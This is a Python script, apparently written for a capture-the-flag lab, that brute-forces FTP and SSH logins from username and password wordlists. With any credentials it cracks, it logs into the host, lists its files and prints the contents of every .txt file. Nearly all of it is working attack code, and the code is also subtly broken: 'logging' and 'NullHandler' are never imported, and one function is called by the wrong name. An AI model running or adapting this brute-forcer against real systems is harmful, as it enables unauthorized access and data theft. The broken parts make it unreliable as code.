import paramiko
import ftplib
import time
import socket
import sys, os
from atack_http import AtackHttp


def brute_force_FTP(targetIP: str) -> None:
    """Gets ip address and tries to login to FTP server 
    users and passwords from file
    uses module ftplib.FTP()

    Args:
        targetIP (str): ip address
    Returns: FTP_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
    """
    print(f"Calling brute_force_FTP on {targetIP}")

    # files: users and passwords operations
    
    password_file = "passwd.txt"
    users_file = "users.txt"
    users = open(users_file)
    passwds = open(password_file)
    users_list = users.read().split("\n")
    pass_list = passwds.read().split("\n")
    users.close()
    passwds.close()

    ftpServer = ftplib.FTP()
    FTP_credentials = {}
    user_pass = []

    for user in users_list:
        user = user.strip()
        for passwd in pass_list:
            passwd = passwd.strip()
            try:
                print(f"Trying: {user}: {passwd}")
                ftpServer.connect(targetIP, 21, timeout=1000)
                ftpServer.login(user, passwd)
                print(f"[+] Found combo for FTP:\n\tHOSTNAME: {targetIP}\n\tUSERNAME: {user}\n\tPASSWORD: {passwd}")
                user_pass.append([user, passwd])
                FTP_credentials[targetIP] = user_pass
                ftpServer.close()
                break
            except Exception as error:
                print(f"[!] {error}")
    return FTP_credentials

def try_connect(hostname, username, password, port=22) -> dict:
    """_summary_
    Args:
        hostname (str): hostname
        username (str): username
        password (str): password
        port (int, optional): port number Defaults to 22.
    Returns:
        dict: dict consists of three parameters: ip, user and password if those are valid otherwise returns False:bool
    """
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=10, port=port)
    except socket.timeout:
        # this is when host is unreachable
        print(f"[!] Host: {hostname} is unreachable, timed out.")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"[*] Quota exceeded, retrying with delay...")
        # sleep for ten seconds
        time.sleep(10)
        return try_connect(hostname, username, password, port)
    else:
        # connection was established successfully
        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return {'hostname' : hostname, 'username' : username, 'password' : password}

def brute_force_SSH(targetIP: str) -> dict:
    """Gets ip address and tries to login to SSH server 
    users and passwords from file
    uses module paramiko.SSHClient()
    Args:
        targetIP (str): ip address
    Returns: SSH_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
    """
    print(f"Calling: brute_force_SSH on {targetIP}")

    # files: users and passwords operations
    password_file = "passwd.txt"
    passwds = open(password_file)
    pass_list = passwds.readlines()
    passwds.close()

    users_file = "users.txt"
    users = open(users_file)
    users_list = users.readlines()
    users.close()

    SSH_credentials = {}
    user_pass = []

    for user in users_list:
        user = user.strip()
        for passwd in pass_list:
            passwd = passwd.strip()
            if try_connect(targetIP, user,passwd):
                user_pass.append([user,passwd])
                break
        
    SSH_credentials[targetIP] = user_pass
    return SSH_credentials # this dict can be used in another function to log in and manipulate on remote system 

def read_remote_files(SSH_credentials: dict) -> None:
    """Tries to log into SSH server and read all txt files. From txt files print content
    Args: SSH_credentials (dict): key: ip address, value: list of lists consists of pair: user/pass
    """
    # initialize SSH client
    sshserver = paramiko.SSHClient()
    # add to know hosts
    sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    sshserver.load_system_host_keys()
    for ip, user_pass in SSH_credentials.items():
        for user, passwd in user_pass:
            # print (ip, user, passwd)
            try:
                sshserver.connect(hostname=ip, username=user, password=passwd, timeout=5)
                ls_command = 'ls -a'
                stdin, stdout, stderr = sshserver.exec_command(ls_command)
                list_of_files = stdout.readlines()
                # print(list_of_files)
                for file in list_of_files:
                    file = file.replace('\n','')
                    if  '.txt' in file:
                        cat_command = 'cat ' + file
                        stdin, stdout, stderr = sshserver.exec_command(cat_command)
                        print(f"[+] Host:{ip} User:{user} flaga: {stdout.readlines()[0].strip()} w pliku: {file}")
                sshserver.close()
            except socket.timeout:
                # this is when host is unreachable
                print(f"[!] Host: {ip} is unreachable, timed out.")

def brute_force(hosts_ports_list: dict):
    for ip_addr, ports in hosts_ports_list.items():
        for port in ports:
            if port == 21:
                print(brute_force_FTP(ip_addr))
            if port == 22:
                slownik = brute_force_SSH(ip_addr)
                #print(slownik)
                #print(brute_force_SSH(ip_addr))
                read_remote_file(slownik)
            #if port == 80:
            #    adres = "http://"+ip_addr
            #    atack = AtackHttp()
            #    atack.print_list(adres)



# param = {'192.168.10.100': (21,22,80)}
# ip = '192.168.10.100'
# # brute_force_FTP(ip)
# # brute_force_SSH(ip)
# brute_force(param)

